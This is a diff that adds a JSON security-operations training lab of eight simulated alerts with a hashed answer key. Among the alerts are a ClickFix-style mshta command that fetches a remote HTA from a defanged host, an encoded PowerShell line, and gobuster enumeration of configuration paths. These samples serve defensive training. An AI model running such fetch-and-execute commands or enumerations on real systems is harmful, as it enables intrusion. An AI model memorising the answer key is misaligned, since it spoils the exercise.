@@ -1,0 +1,137 @@
+{
+  "version": 1,
+  "name": "Second lab",
+  "ec": "full",
+  "salt": "11a0839eb95ff466a6235b2647c3d4dcab7ab5c92d169675d8de628349a275fe",
+  "solution": [
+    "9117cc8643147e1e9b3c842a9a62b2c76e3d5fb6cb92cc7807894ab0f3754d99",
+    "31a2069a89c4c2594d26058b7228ac5a959ddbff551a9ae8e064408a0526399f",
+    "6169b1737afe91519ab32ee15a064a3d88b171c4cb7b432e8a811e83f8be3e13",
+    "ecdbedbb85a3c5919f6e418b95b94f0edc58a90624561c76699215497662ef55",
+    "513125649884beebb5f0545130dbd6f50c2fbf813e1be2584a3bc7b10fbb29d2",
+    "a38bff28bff04c6b8959110493e1922874796f14a129f63fd43ebe9c72cc70c4",
+    "e21202aee4910c8fef1c689e93ce89323a55b009895538cca0664e06376e3865",
+    "75e5a3209d58b0a480cce34cb68ea40ce7be998e6c1ca3fcb7fe3d1c771c37b9"
+  ],
+  "alerts": [
+    {
+      "id": 1, "timestamp": 1766616998, "severity": 1,
+      "briefdesc": "TCP scanning detected",
+      "description": "Matches various TCP scan characteristics, such as Connection scan, Silent scan, FIN scan and Xmas scan.",
+      "fields": {
+        "src_ip": "192.168.136.48",
+        "src_hostname": "MRK-405-PC-16",
+        "department": "Marketing",
+        "username": "DoeJan",
+        "packets_detected": 72,
+        "IPs_targeted": 24,
+        "ports_targeted": "[22, 445, 3389]",
+        "flags": "[FIN, PSH, URG]"
+      }
+    },
+    {
+      "id": 2, "timestamp": 1766617155, "severity": 2,
+      "briefdesc": "Powershell execution using Base64 payload",
+      "description": "Matches any command using powershell with -e, -enc or -EncodedCommand option as it is often indicator of malicious activity and masquerading attempts.",
+      "fields": {
+        "host_ip": "192.168.10.6",
+        "hostname": "SRV-AD-1",
+        "department": "Server",
+        "username": "SYSTEM",
+        "pid": 5466,
+        "parent_process": "svchost.exe",
+        "command_line": "powershell.exe -e JGN1cnJlbnRUaW1lID0gR2V0LURhdGUNCldyaXRlLUhvc3QgIkN1cnJlbnQgVGltZTogJGN1cnJlbnRUaW1lIg=="
+      }
+    },
+    {
+      "id": 3, "timestamp": 1766617855, "severity": 2,
+      "briefdesc": "Suspicious executable payload in clipboard",
+      "description": "Attackers can often exploit the human vector to make users copy and paste malicious commands into the Windows Run prompt (Win+R)",
+      "fields": {
+        "host_ip": "192.168.84.12",
+        "hostname": "ACC-LAPTOP-5",
+        "department": "Accounting department",
+        "user": "SmithCar",
+        "command_executable": "Microsoft HTML application host",
+        "command_line": "mshta.exe hxxps://x63-hello.live/nF3mXcQ9FVjs1sMt.html #'' I'm human ID241619''"
+      }
+    },
+    {
+      "id": 4, "timestamp": 1766617955, "severity": 3,
+      "briefdesc": "Possible C2 beacon activity",
+      "description": "This rule detects periodic connection activity up to beaconing every 5 minutes. This is often a sign of C2 communication.",
+      "fields": {
+        "host_ip": "192.168.10.3",
+        "hostname": "SRV-WEB-2",
+        "department": "Server",
+        "user": "root",
+        "interval [s]": 60,
+        "dst_ip": "91.189.91.98",
+        "dst_name": "connectivity-check.ubuntu.com",
+        "parent_process": "NetworkManager",
+        "command_line": "curl -fsS http://connectivity-check.ubuntu.com"
+      }
+    },
+    {
+      "id": 5, "timestamp": 1766618123, "severity": 3,
+      "briefdesc": "Possible web path / configuration file enumeration",
+      "description": "This rule signifies and attacker trying to enumerate common paths for a web service (/wp-config.php, /backup.zip, etc.). This is detected by a spike in amount of 404 responses from the server.",
+      "fields": {
+        "host_ip": "192.168.10.3",
+        "hostname": "SRV-WEB-2",
+        "department": "Server",
+        "src_ip": "75.11.222.16",
+        "src_hostname": "Unknown (Outside IP)",
+        "user_agent": "gobuster/3.1.0",
+        "requests_total": 687,
+        "requests_404": 682
+      }
+    },
+    {
+      "id": 6, "timestamp": 1766619977, "severity": 4,
+      "briefdesc": "Protocol over non-standard port",
+      "description": "Attackers will often use non-standard ports for C2 communication to avoid detection.",
+      "fields": {
+        "host_ip": "192.168.5.11",
+        "hostname": "SWD-3-PC-5",
+        "department": "Software development",
+        "dst_ip": "192.168.5.13",
+        "dst_hostname": "SWD-SRV-DEV-1",
+        "protocol": "HTTP",
+        "port": 5000,
+        "path": "/login",
+        "url": "http://192.168.5.13:5000/login"
+      }
+    },
+    {
+      "id": 7, "timestamp": 1766625555, "severity": 1,
+      "briefdesc": "Possible Data Exfiltration",
+      "description": "This rule matches anytime the amount of traffic from a device reaches over 3GB per day.",
+      "fields": {
+        "host_ip": "192.168.11.2",
+        "hostname": "CFR-ROOM-1",
+        "department": "Conference room",
+        "dst_ip": "62.156.133.177",
+        "dst_hostname": "Unknown (Outside IP)",
+        "domain": "*.zoom.us",
+        "outbound_traffic": "5.32 GB",
+        "inbound_traffic": "5.02 GB"
+      }
+    },
+    {
+      "id": 8, "timestamp": 1766725555, "severity": 3,
+      "briefdesc": "Unusual User-Agent detected",
+      "description": "This alert triggers when a request to a web server features an unusual User-Agent (defined through a list)",
+      "fields": {
+        "host_ip": "192.168.10.2",
+        "hostname": "SRV-WEB-1",
+        "department": "Server",
+        "src_ip": "127.0.0.1",
+        "src_hostname": "SRV-WEB-1",
+        "user_agent": "curl/7.68.0",
+        "request_domain": "internal.company.cz",
+        "request_path": "/"
+      }
+    }
+  ]
+}
